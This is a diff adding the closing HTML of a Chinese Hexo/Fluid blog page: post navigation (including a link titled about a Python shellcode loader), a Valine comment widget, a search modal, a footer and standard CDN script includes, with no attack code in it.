+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/03/18/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%AE%9E%E7%8E%B0-Python/">
+                        <span class="hidden-mobile">Shellcode加载器实现-Python</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
